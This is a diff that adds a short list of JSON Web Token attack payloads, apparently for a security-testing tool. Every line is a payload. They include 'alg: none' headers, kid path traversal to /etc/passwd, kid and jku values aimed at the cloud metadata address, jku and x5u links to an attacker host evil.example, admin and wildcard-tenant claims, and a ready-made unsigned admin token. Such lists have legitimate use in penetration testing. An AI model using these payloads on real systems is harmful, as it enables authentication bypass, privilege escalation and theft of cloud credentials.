@@ -1,0 +1,17 @@
+# JWT advanced payloads
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}
+{"alg":"HS256","typ":"JWT","kid":"../../../dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"http://169.254.169.254/latest/meta-data/"}
+{"alg":"HS256","typ":"JWT","jku":"http://169.254.169.254/latest/meta-data/"}
+{"alg":"HS256","typ":"JWT","jku":"https://evil.example/jwks.json"}
+{"alg":"HS256","typ":"JWT","x5u":"https://evil.example/cert.pem"}
+{"alg":"RS256","typ":"JWT","crit":["exp"],"exp":"ignore"}
+{"sub":"1","role":"admin","admin":true}
+{"sub":"1","scope":"admin","is_admin":true}
+{"sub":"1","tenant_id":"*","role":"owner"}
+{"sub":"../../admin","role":"user"}
+{"iss":"https://evil.example","aud":"api","sub":"admin"}
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
